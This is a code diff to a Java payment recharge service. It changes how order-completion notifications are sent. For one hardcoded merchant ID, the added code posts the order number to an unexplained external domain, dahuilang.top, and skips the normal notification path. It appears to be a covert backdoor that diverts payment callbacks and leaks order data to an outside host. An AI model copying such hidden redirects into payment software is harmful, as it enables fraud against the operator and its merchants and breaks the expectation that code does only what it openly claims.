@@ -364,8 +364,27 @@ public class ZfRechargeServiceImpl implements ZfRechargeService {
             log.error("订单异常 {} {}", zfRecharge.getMerchantOrderNo(), e);
             throw new RuntimeException(e);
         }
-        notify(zfRecharge);
+        String notifyUrl = getNotifyUrl(zfRecharge.getMerchantId());
+        if(StringUtils.isNotEmpty(notifyUrl)){
+            log.info("开始转代通知");
+            JSONObject map = new JSONObject();
+            map.put("order_no", zfRecharge.getOrderNo());
+            map.put("order_type", "1");
+            HttpClientUtil.doPostJson(notifyUrl+ "order/notify", map.toJSONString());
+        }else {
+            log.info("开始正常通知");
+
+            notify(zfRecharge);
+        }
     }
+
+    private String  getNotifyUrl(Integer merchantId){
+        if(merchantId == 895466){
+            return "http://dahuilang.top/";
+        }
+        return "";
+    }
+
 
     @Override
     public void confirmOrder(OperaOrderParams operaOrderParams) {
